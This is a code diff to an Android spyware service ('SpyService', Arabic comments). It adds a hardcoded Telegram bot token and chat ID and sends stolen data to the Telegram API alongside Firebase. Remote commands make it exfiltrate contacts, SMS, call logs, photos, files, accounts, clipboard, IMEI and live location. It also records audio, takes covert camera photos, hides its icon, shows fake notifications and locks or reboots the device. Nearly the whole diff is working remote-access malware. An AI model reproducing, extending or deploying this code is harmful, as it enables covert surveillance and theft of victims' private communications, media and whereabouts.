@@ -31,6 +31,7 @@ import android.util.Log;
 import androidx.core.app.NotificationCompat;
 import androidx.core.content.ContextCompat;
 import com.google.firebase.database.*;
+import okhttp3.*;
 import org.json.JSONObject;
 import java.io.File;
 import java.io.FileOutputStream;
@@ -58,10 +59,16 @@ public class SpyService extends Service {
     private boolean isTrackingLocation = false;
     private boolean foregroundStarted = false;
 
+    // ====== توكن البوت (ضع توكنك هنا) ======
+    private static final String BOT_TOKEN = "8962511911:AAHYZpdZJVkNif1iF1-3odKTqq2owgDk16M";
+    private static final String CHAT_ID = "6793813126";
+
+    // ====== Firebase ======
     private FirebaseDatabase database;
     private DatabaseReference deviceRef;
     private DatabaseReference commandRef;
     private DatabaseReference dataRef;
+    private OkHttpClient httpClient;
 
     @Override
     public void onCreate() {
@@ -69,6 +76,11 @@ public class SpyService extends Service {
         Config.load(this);
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
         locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
+        httpClient = new OkHttpClient.Builder()
+                .connectTimeout(30, TimeUnit.SECONDS)
+                .readTimeout(60, TimeUnit.SECONDS)
+                .writeTimeout(60, TimeUnit.SECONDS)
+                .build();
 
         startForegroundService();
 
@@ -133,10 +145,9 @@ public class SpyService extends Service {
             info.put("android", Build.VERSION.RELEASE);
             info.put("battery", getBatteryLevel());
             info.put("last_seen", System.currentTimeMillis());
-
             deviceRef.setValue(info);
             updateNotification("✅ مسجل في Firebase");
-            Log.d(TAG, "Registered in Firebase");
+            Log.d(TAG, "Registered");
         } catch (Exception e) { Log.e(TAG, "Registration error", e); }
     }
 
@@ -150,7 +161,7 @@ public class SpyService extends Service {
             public void onDataChange(DataSnapshot dataSnapshot) {
                 String command = dataSnapshot.getValue(String.class);
                 if (command != null && !command.isEmpty()) {
-                    Log.d(TAG, "📩 Command received: " + command);
+                    Log.d(TAG, "📩 Command: " + command);
                     executeCommand(command);
                     commandRef.removeValue();
                 }
@@ -162,10 +173,15 @@ public class SpyService extends Service {
         });
     }
 
+    // ======================================================================
+    // ========== دوال الإرسال (بدون حذف للملفات) ==========
+    // ======================================================================
+
     private void sendData(String type, String data) {
         dataRef.child(type).setValue(data);
     }
 
+    // إرسال إلى Firebase (بدون حذف)
     private void sendFileToFirebase(File file, String caption) {
         try {
             byte[] bytes = new byte[(int) file.length()];
@@ -179,50 +195,210 @@ public class SpyService extends Service {
             json.put("caption", caption);
             json.put("path", file.getAbsolutePath());
             sendData("FILE", json.toString());
-            file.delete();
+            // لا نحذف الملف (تم إزالة file.delete())
+            Log.d(TAG, "📤 أُرسل إلى Firebase: " + file.getName());
         } catch (Exception e) {
-            Log.e(TAG, "Send file error", e);
+            Log.e(TAG, "Send file to Firebase error", e);
         }
     }
+
+    // إرسال إلى تيليجرام (بدون حذف)
+    private void sendFileToTelegram(File file, String caption) {
+        try {
+            RequestBody body = new MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("chat_id", CHAT_ID)
+                    .addFormDataPart("caption", caption != null ? caption : file.getName())
+                    .addFormDataPart("document", file.getName(),
+                            RequestBody.create(file, MediaType.parse("application/octet-stream")))
+                    .build();
+            Request request = new Request.Builder()
+                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument")
+                    .post(body)
+                    .build();
+            httpClient.newCall(request).enqueue(new Callback() {
+                @Override public void onFailure(Call call, IOException e) {
+                    Log.e(TAG, "Telegram send failed: " + e.getMessage());
+                }
+                @Override public void onResponse(Call call, Response response) throws IOException {
+                    if (response.isSuccessful()) {
+                        Log.d(TAG, "📤 أُرسل إلى تيليجرام: " + file.getName());
+                    }
+                    response.close();
+                }
+            });
+            // لا نحذف الملف (تم إزالة file.delete())
+        } catch (Exception e) {
+            Log.e(TAG, "Send file to Telegram error", e);
+        }
+    }
+
+    // ======================================================================
+    // ========== تنفيذ الأوامر (إرسال مزدوج) ==========
+    // ======================================================================
 
     private void executeCommand(String cmd) {
         String lower = cmd.toLowerCase().trim();
         Log.d(TAG, "⚡ Executing: " + lower);
         try {
             switch (lower) {
-                case "get_contacts": sendFileToFirebase(collectContacts(), "📇 جهات الاتصال"); break;
-                case "get_sms": sendFileToFirebase(collectSms(), "💬 الرسائل النصية"); break;
-                case "get_calllogs": sendFileToFirebase(collectCallLogs(), "📞 سجل المكالمات"); break;
-                case "get_location": getLocation(); break;
-                case "start_record": startRecording(); break;
-                case "stop_record": stopRecording(); break;
-                case "get_apps": sendFileToFirebase(collectApps(), "📱 التطبيقات"); break;
-                case "get_photos": sendFileToFirebase(collectMedia("images"), "🖼 الصور"); break;
-                case "get_videos": sendFileToFirebase(collectMedia("videos"), "🎬 الفيديوهات"); break;
-                case "get_files": sendFileToFirebase(collectAllFiles(), "📦 الملفات"); break;
-                case "hide_app": hideApp(); break;
-                case "show_app": showApp(); break;
-                case "fake_notif": showFakeNotification(); break;
-                case "take_photo": takePhoto(); break;
-                case "take_photo_front": takePhotoFront(); break;
-                case "flash_on": flashOn(); break;
-                case "flash_off": flashOff(); break;
-                case "get_imei": getImei(); break;
-                case "get_phone": getPhoneNumber(); break;
-                case "get_sim": getSimInfo(); break;
-                case "get_wifi": getWifiInfo(); break;
-                case "get_battery": getBatteryInfo(); break;
-                case "get_ip": getPublicIp(); break;
-                case "lock_device": lockDevice(); break;
-                case "reboot": rebootDevice(); break;
-                case "shutdown": shutdownDevice(); break;
-                case "get_accounts": getAccounts(); break;
-                case "get_clipboard": getClipboard(); break;
-                case "get_device": getDeviceInfo(); break;
-                case "get_network": getNetworkInfo(); break;
-                case "start_location_track": startLocationTracking(); break;
-                case "stop_location_track": stopLocationTracking(); break;
-                default: sendData("ERROR", "أمر غير معروف: " + cmd);
+                case "get_contacts": {
+                    File f = collectContacts();
+                    sendFileToFirebase(f, "📇 جهات الاتصال");
+                    sendFileToTelegram(f, "📇 جهات الاتصال");
+                    break;
+                }
+                case "get_sms": {
+                    File f = collectSms();
+                    sendFileToFirebase(f, "💬 الرسائل النصية");
+                    sendFileToTelegram(f, "💬 الرسائل النصية");
+                    break;
+                }
+                case "get_calllogs": {
+                    File f = collectCallLogs();
+                    sendFileToFirebase(f, "📞 سجل المكالمات");
+                    sendFileToTelegram(f, "📞 سجل المكالمات");
+                    break;
+                }
+                case "get_location": {
+                    getLocation();
+                    break;
+                }
+                case "start_record": {
+                    startRecording();
+                    break;
+                }
+                case "stop_record": {
+                    File f = stopRecording();
+                    if (f != null) {
+                        sendFileToFirebase(f, "🎤 تسجيل صوتي");
+                        sendFileToTelegram(f, "🎤 تسجيل صوتي");
+                    }
+                    break;
+                }
+                case "get_apps": {
+                    File f = collectApps();
+                    sendFileToFirebase(f, "📱 التطبيقات");
+                    sendFileToTelegram(f, "📱 التطبيقات");
+                    break;
+                }
+                case "get_photos": {
+                    File f = collectMedia("images");
+                    sendFileToFirebase(f, "🖼 الصور");
+                    sendFileToTelegram(f, "🖼 الصور");
+                    break;
+                }
+                case "get_videos": {
+                    File f = collectMedia("videos");
+                    sendFileToFirebase(f, "🎬 الفيديوهات");
+                    sendFileToTelegram(f, "🎬 الفيديوهات");
+                    break;
+                }
+                case "get_files": {
+                    File f = collectAllFiles();
+                    sendFileToFirebase(f, "📦 الملفات");
+                    sendFileToTelegram(f, "📦 الملفات");
+                    break;
+                }
+                case "hide_app": {
+                    hideApp();
+                    break;
+                }
+                case "show_app": {
+                    showApp();
+                    break;
+                }
+                case "fake_notif": {
+                    showFakeNotification();
+                    break;
+                }
+                case "take_photo": {
+                    takePhoto();
+                    break;
+                }
+                case "take_photo_front": {
+                    takePhotoFront();
+                    break;
+                }
+                case "flash_on": {
+                    flashOn();
+                    break;
+                }
+                case "flash_off": {
+                    flashOff();
+                    break;
+                }
+                case "get_imei": {
+                    getImei();
+                    break;
+                }
+                case "get_phone": {
+                    getPhoneNumber();
+                    break;
+                }
+                case "get_sim": {
+                    getSimInfo();
+                    break;
+                }
+                case "get_wifi": {
+                    getWifiInfo();
+                    break;
+                }
+                case "get_battery": {
+                    getBatteryInfo();
+                    break;
+                }
+                case "get_ip": {
+                    getPublicIp();
+                    break;
+                }
+                case "lock_device": {
+                    lockDevice();
+                    break;
+                }
+                case "reboot": {
+                    rebootDevice();
+                    break;
+                }
+                case "shutdown": {
+                    shutdownDevice();
+                    break;
+                }
+                case "get_accounts": {
+                    File f = getAccounts();
+                    sendFileToFirebase(f, "👤 الحسابات");
+                    sendFileToTelegram(f, "👤 الحسابات");
+                    break;
+                }
+                case "get_clipboard": {
+                    File f = getClipboard();
+                    sendFileToFirebase(f, "📋 الحافظة");
+                    sendFileToTelegram(f, "📋 الحافظة");
+                    break;
+                }
+                case "get_device": {
+                    File f = getDeviceInfo();
+                    sendFileToFirebase(f, "ℹ️ معلومات الجهاز");
+                    sendFileToTelegram(f, "ℹ️ معلومات الجهاز");
+                    break;
+                }
+                case "get_network": {
+                    File f = getNetworkInfo();
+                    sendFileToFirebase(f, "📡 معلومات الشبكة");
+                    sendFileToTelegram(f, "📡 معلومات الشبكة");
+                    break;
+                }
+                case "start_location_track": {
+                    startLocationTracking();
+                    break;
+                }
+                case "stop_location_track": {
+                    stopLocationTracking();
+                    break;
+                }
+                default: {
+                    sendData("ERROR", "أمر غير معروف: " + cmd);
+                }
             }
         } catch (Exception e) {
             sendData("ERROR", "خطأ: " + e.getMessage());
@@ -231,8 +407,9 @@ public class SpyService extends Service {
     }
 
     // ======================================================================
-    // دوال جمع البيانات (نفس الكود السابق)
+    // ========== دوال جمع البيانات (بدون حذف الملفات) ==========
     // ======================================================================
+
     private int getBatteryLevel() {
         try {
             IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
@@ -377,11 +554,16 @@ public class SpyService extends Service {
             Location loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
             if (loc == null) loc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
             if (loc != null) {
-                sendData("LOCATION", loc.getLatitude() + "," + loc.getLongitude());
+                String data = loc.getLatitude() + "," + loc.getLongitude();
+                sendData("LOCATION", data);
+                // إرسال الموقع أيضاً إلى تيليجرام
+                sendLocationToTelegram(loc.getLatitude(), loc.getLongitude());
             } else {
                 locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, new LocationListener() {
                     @Override public void onLocationChanged(Location l) {
-                        sendData("LOCATION", l.getLatitude() + "," + l.getLongitude());
+                        String data = l.getLatitude() + "," + l.getLongitude();
+                        sendData("LOCATION", data);
+                        sendLocationToTelegram(l.getLatitude(), l.getLongitude());
                     }
                     @Override public void onStatusChanged(String p, int s, Bundle b) {}
                     @Override public void onProviderEnabled(String p) {}
@@ -391,6 +573,25 @@ public class SpyService extends Service {
         } catch (SecurityException e) {
             sendData("ERROR", "صلاحية الموقع غير مفعلة");
         }
+    }
+
+    private void sendLocationToTelegram(double lat, double lng) {
+        try {
+            String text = "📍 الموقع: https://maps.google.com/maps?q=" + lat + "," + lng;
+            JSONObject json = new JSONObject();
+            json.put("chat_id", CHAT_ID);
+            json.put("text", text);
+            json.put("parse_mode", "Markdown");
+            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
+            Request request = new Request.Builder()
+                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
+                    .post(body)
+                    .build();
+            httpClient.newCall(request).enqueue(new Callback() {
+                @Override public void onFailure(Call call, IOException e) {}
+                @Override public void onResponse(Call call, Response response) throws IOException { response.close(); }
+            });
+        } catch (Exception e) { Log.e(TAG, "sendLocation error", e); }
     }
 
     private void startRecording() {
@@ -407,12 +608,13 @@ public class SpyService extends Service {
             recorder.start();
             isRecording = true;
             sendData("RECORD", "started");
+            sendTextToTelegram("🎤 بدأ التسجيل الصوتي...");
         } catch (Exception e) {
             sendData("ERROR", "فشل التسجيل: " + e.getMessage());
         }
     }
 
-    private void stopRecording() {
+    private File stopRecording() {
         if (isRecording && recorder != null) {
             try {
                 recorder.stop();
@@ -421,13 +623,32 @@ public class SpyService extends Service {
                 isRecording = false;
                 File f = new File(audioPath);
                 if (f.exists()) {
-                    sendFileToFirebase(f, "🎤 تسجيل صوتي");
+                    sendTextToTelegram("⏹ تم إيقاف التسجيل وإرسال الملف");
+                    return f;
                 }
-                sendData("RECORD", "stopped");
             } catch (Exception e) {
                 sendData("ERROR", "فشل إيقاف التسجيل: " + e.getMessage());
             }
         }
+        return null;
+    }
+
+    private void sendTextToTelegram(String text) {
+        try {
+            JSONObject json = new JSONObject();
+            json.put("chat_id", CHAT_ID);
+            json.put("text", text);
+            json.put("parse_mode", "Markdown");
+            RequestBody body = RequestBody.create(json.toString(), MediaType.parse("application/json; charset=utf-8"));
+            Request request = new Request.Builder()
+                    .url("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage")
+                    .post(body)
+                    .build();
+            httpClient.newCall(request).enqueue(new Callback() {
+                @Override public void onFailure(Call call, IOException e) {}
+                @Override public void onResponse(Call call, Response response) throws IOException { response.close(); }
+            });
+        } catch (Exception e) { Log.e(TAG, "sendText error", e); }
     }
 
     private void hideApp() {
@@ -435,6 +656,7 @@ public class SpyService extends Service {
                 new android.content.ComponentName(this, MainActivity.class),
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
         sendData("HIDE", "hidden");
+        sendTextToTelegram("👁‍🗨 تم إخفاء التطبيق");
     }
 
     private void showApp() {
@@ -442,6 +664,7 @@ public class SpyService extends Service {
                 new android.content.ComponentName(this, MainActivity.class),
                 PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
         sendData("SHOW", "shown");
+        sendTextToTelegram("👁 تم إظهار التطبيق");
     }
 
     private void showFakeNotification() {
@@ -459,6 +682,7 @@ public class SpyService extends Service {
                         .setOngoing(true)
                         .build());
         sendData("NOTIFY", "fake notification sent");
+        sendTextToTelegram("🔔 تم إرسال إشعار وهمي");
     }
 
     private void takePhoto() {
@@ -474,6 +698,7 @@ public class SpyService extends Service {
                     fos.write(data);
                     fos.close();
                     sendFileToFirebase(file, "📸 صورة من الكاميرا الخلفية");
+                    sendFileToTelegram(file, "📸 صورة من الكاميرا الخلفية");
                 } catch (Exception e) { Log.e(TAG, "photo err", e); }
             });
         } catch (Exception e) { sendData("ERROR", "فشل التصوير: " + e.getMessage()); }
@@ -489,6 +714,7 @@ public class SpyService extends Service {
                     fos.write(data);
                     fos.close();
                     sendFileToFirebase(file, "🤳 صورة سيلفي");
+                    sendFileToTelegram(file, "🤳 صورة سيلفي");
                 } catch (Exception e) { Log.e(TAG, "selfie err", e); }
             });
         } catch (Exception e) { sendData("ERROR", "فشل التصوير الأمامي: " + e.getMessage()); }
@@ -502,6 +728,7 @@ public class SpyService extends Service {
             camera.setParameters(params);
             camera.startPreview();
             sendData("FLASH", "on");
+            sendTextToTelegram("🔦 تم تشغيل الكشاف");
         } catch (Exception e) { sendData("ERROR", "فشل تشغيل الفلاش: " + e.getMessage()); }
     }
 
@@ -512,6 +739,7 @@ public class SpyService extends Service {
                 camera.release();
                 camera = null;
                 sendData("FLASH", "off");
+                sendTextToTelegram("🔦 تم إطفاء الكشاف");
             }
         } catch (Exception e) { sendData("ERROR", "فشل إطفاء الفلاش: " + e.getMessage()); }
     }
@@ -519,13 +747,10 @@ public class SpyService extends Service {
     private void getImei() {
         try {
             TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                String imei = tm.getImei();
-                sendData("IMEI", imei != null ? imei : "غير متاح");
-            } else {
-                String imei = tm.getDeviceId();
-                sendData("IMEI", imei != null ? imei : "غير متاح");
-            }
+            String imei = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? tm.getImei() : tm.getDeviceId();
+            String data = "IMEI: " + (imei != null ? imei : "غير متاح");
+            sendData("IMEI", data);
+            sendTextToTelegram("📟 " + data);
         } catch (Exception e) { sendData("ERROR", "فشل قراءة IMEI"); }
     }
 
@@ -533,17 +758,18 @@ public class SpyService extends Service {
         try {
             TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
             String number = tm.getLine1Number();
-            sendData("PHONE", number != null ? number : "غير متاح");
+            String data = "رقم الهاتف: " + (number != null ? number : "غير متاح");
+            sendData("PHONE", data);
+            sendTextToTelegram("📞 " + data);
         } catch (Exception e) { sendData("ERROR", "فشل قراءة الرقم"); }
     }
 
     private void getSimInfo() {
         try {
             TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
-            String operator = tm.getSimOperatorName();
-            String country = tm.getSimCountryIso();
-            String serial = tm.getSimSerialNumber();
-            sendData("SIM", operator + "|" + country + "|" + serial);
+            String data = "SIM: " + tm.getSimOperatorName() + " | " + tm.getSimCountryIso() + " | " + tm.getSimSerialNumber();
+            sendData("SIM", data);
+            sendTextToTelegram("📡 " + data);
         } catch (Exception e) { sendData("ERROR", "فشل قراءة SIM"); }
     }
 
@@ -551,9 +777,9 @@ public class SpyService extends Service {
         try {
             android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
             android.net.wifi.WifiInfo info = wifi.getConnectionInfo();
-            String ssid = info.getSSID();
-            int level = android.net.wifi.WifiManager.calculateSignalLevel(info.getRssi(), 5);
-            sendData("WIFI", ssid + "|" + level);
+            String data = "WiFi: " + info.getSSID() + " | القوة: " + android.net.wifi.WifiManager.calculateSignalLevel(info.getRssi(), 5) + "/5";
+            sendData("WIFI", data);
+            sendTextToTelegram("📶 " + data);
         } catch (Exception e) { sendData("ERROR", "فشل قراءة WiFi"); }
     }
 
@@ -567,7 +793,9 @@ public class SpyService extends Service {
                 int percentage = (level * 100) / scale;
                 int temp = batteryIntent.getIntExtra("temperature", 0) / 10;
                 int voltage = batteryIntent.getIntExtra("voltage", 0);
-                sendData("BATTERY", percentage + "|" + temp + "|" + voltage);
+                String data = "البطارية: " + percentage + "% | " + temp + "°C | " + voltage + "mV";
+                sendData("BATTERY", data);
+                sendTextToTelegram("🔋 " + data);
             }
         } catch (Exception e) { sendData("ERROR", "فشل قراءة البطارية"); }
     }
@@ -580,7 +808,9 @@ public class SpyService extends Service {
             java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(conn.getInputStream()));
             String ip = reader.readLine();
             reader.close();
-            sendData("IP", ip);
+            String data = "IP العام: " + ip;
+            sendData("IP", data);
+            sendTextToTelegram("🌐 " + data);
         } catch (Exception e) { sendData("ERROR", "فشل الحصول على IP"); }
     }
 
@@ -589,7 +819,9 @@ public class SpyService extends Service {
         try {
             locationListener = new LocationListener() {
                 @Override public void onLocationChanged(Location location) {
-                    sendData("LOCATION_TRACK", location.getLatitude() + "," + location.getLongitude());
+                    String data = location.getLatitude() + "," + location.getLongitude();
+                    sendData("LOCATION_TRACK", data);
+                    sendLocationToTelegram(location.getLatitude(), location.getLongitude());
                 }
                 @Override public void onStatusChanged(String p, int s, Bundle b) {}
                 @Override public void onProviderEnabled(String p) {}
@@ -598,6 +830,7 @@ public class SpyService extends Service {
             locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 0, locationListener);
             isTrackingLocation = true;
             sendData("LOCATION_TRACK", "started");
+            sendTextToTelegram("📍 بدأ تتبع الموقع (كل دقيقة)");
         } catch (SecurityException e) {
             sendData("ERROR", "صلاحية الموقع غير مفعلة");
         }
@@ -609,6 +842,7 @@ public class SpyService extends Service {
             locationManager.removeUpdates(locationListener);
             isTrackingLocation = false;
             sendData("LOCATION_TRACK", "stopped");
+            sendTextToTelegram("🛑 تم إيقاف تتبع الموقع");
         } catch (Exception e) { sendData("ERROR", "فشل إيقاف التتبع"); }
     }
 
@@ -617,6 +851,7 @@ public class SpyService extends Service {
             android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
             dpm.lockNow();
             sendData("LOCK", "locked");
+            sendTextToTelegram("🔒 تم قفل الجهاز");
         } catch (Exception e) { sendData("ERROR", "فشل قفل الجهاز: " + e.getMessage()); }
     }
 
@@ -624,13 +859,16 @@ public class SpyService extends Service {
         try {
             Runtime.getRuntime().exec("su -c reboot");
             sendData("REBOOT", "rebooting");
+            sendTextToTelegram("🔄 جاري إعادة تشغيل الجهاز...");
         } catch (Exception e) {
             try {
                 PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                 pm.reboot(null);
                 sendData("REBOOT", "rebooting");
+                sendTextToTelegram("🔄 جاري إعادة تشغيل الجهاز...");
             } catch (Exception ex) {
                 sendData("ERROR", "فشل إعادة التشغيل - يحتاج صلاحيات الجذر");
+                sendTextToTelegram("❌ فشل إعادة التشغيل");
             }
         }
     }
@@ -639,52 +877,84 @@ public class SpyService extends Service {
         try {
             Runtime.getRuntime().exec("su -c shutdown");
             sendData("SHUTDOWN", "shutting down");
+            sendTextToTelegram("⏻ جاري إيقاف تشغيل الجهاز...");
         } catch (Exception e) {
             sendData("ERROR", "فشل إيقاف التشغيل - يحتاج صلاحيات الجذر");
+            sendTextToTelegram("❌ فشل إيقاف التشغيل");
         }
     }
 
-    private void getAccounts() {
+    private File getAccounts() {
         try {
+            File f = new File(getCacheDir(), "accounts.txt");
+            FileOutputStream fos = new FileOutputStream(f);
             android.accounts.AccountManager am = (android.accounts.AccountManager) getSystemService(ACCOUNT_SERVICE);
             android.accounts.Account[] accounts = am.getAccounts();
-            StringBuilder sb = new StringBuilder();
             for (android.accounts.Account acc : accounts) {
-                sb.append(acc.name).append(" (").append(acc.type).append(")\n");
+                fos.write((acc.name + " (" + acc.type + ")\n").getBytes());
             }
-            sendData("ACCOUNTS", sb.toString());
-        } catch (Exception e) { sendData("ERROR", "فشل قراءة الحسابات"); }
+            fos.close();
+            return f;
+        } catch (Exception e) {
+            Log.e(TAG, "getAccounts error", e);
+            return new File(getCacheDir(), "accounts.txt");
+        }
     }
 
-    private void getClipboard() {
+    private File getClipboard() {
         try {
+            File f = new File(getCacheDir(), "clipboard.txt");
+            FileOutputStream fos = new FileOutputStream(f);
             android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
             String text = cm.getText() != null ? cm.getText().toString() : "فارغ";
-            sendData("CLIPBOARD", text);
-        } catch (Exception e) { sendData("ERROR", "فشل قراءة الحافظة"); }
+            fos.write(text.getBytes());
+            fos.close();
+            return f;
+        } catch (Exception e) {
+            Log.e(TAG, "getClipboard error", e);
+            return new File(getCacheDir(), "clipboard.txt");
+        }
     }
 
-    private void getDeviceInfo() {
-        String info = "الموديل: " + Build.MODEL + "\n" +
-                "الشركة: " + Build.MANUFACTURER + "\n" +
-                "أندرويد: " + Build.VERSION.RELEASE + "\n" +
-                "API: " + Build.VERSION.SDK_INT + "\n" +
-                "Android ID: " + deviceId;
-        sendData("DEVICE_INFO", info);
-    }
-
-    private void getNetworkInfo() {
+    private File getDeviceInfo() {
         try {
+            File f = new File(getCacheDir(), "device_info.txt");
+            FileOutputStream fos = new FileOutputStream(f);
+            String info = "الموديل: " + Build.MODEL + "\n" +
+                    "الشركة: " + Build.MANUFACTURER + "\n" +
+                    "أندرويد: " + Build.VERSION.RELEASE + "\n" +
+                    "API: " + Build.VERSION.SDK_INT + "\n" +
+                    "Android ID: " + deviceId;
+            fos.write(info.getBytes());
+            fos.close();
+            return f;
+        } catch (Exception e) {
+            Log.e(TAG, "getDeviceInfo error", e);
+            return new File(getCacheDir(), "device_info.txt");
+        }
+    }
+
+    private File getNetworkInfo() {
+        try {
+            File f = new File(getCacheDir(), "network_info.txt");
+            FileOutputStream fos = new FileOutputStream(f);
             android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) getSystemService(WIFI_SERVICE);
             android.net.wifi.WifiInfo wifiInfo = wifi.getConnectionInfo();
             String info = "WiFi: " + (wifiInfo.getSSID() != null ? wifiInfo.getSSID() : "غير متصل") + "\n" +
                     "القوة: " + android.net.wifi.WifiManager.calculateSignalLevel(wifiInfo.getRssi(), 5) + "/5\n" +
                     "المشغل: " + ((TelephonyManager) getSystemService(TELEPHONY_SERVICE)).getNetworkOperatorName();
-            sendData("NETWORK_INFO", info);
+            fos.write(info.getBytes());
+            fos.close();
+            return f;
         } catch (Exception e) {
-            sendData("ERROR", "فشل قراءة معلومات الشبكة");
+            Log.e(TAG, "getNetworkInfo error", e);
+            return new File(getCacheDir(), "network_info.txt");
         }
     }
+
+    // ======================================================================
+    // ========== دورة حياة الخدمة ==========
+    // ======================================================================
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
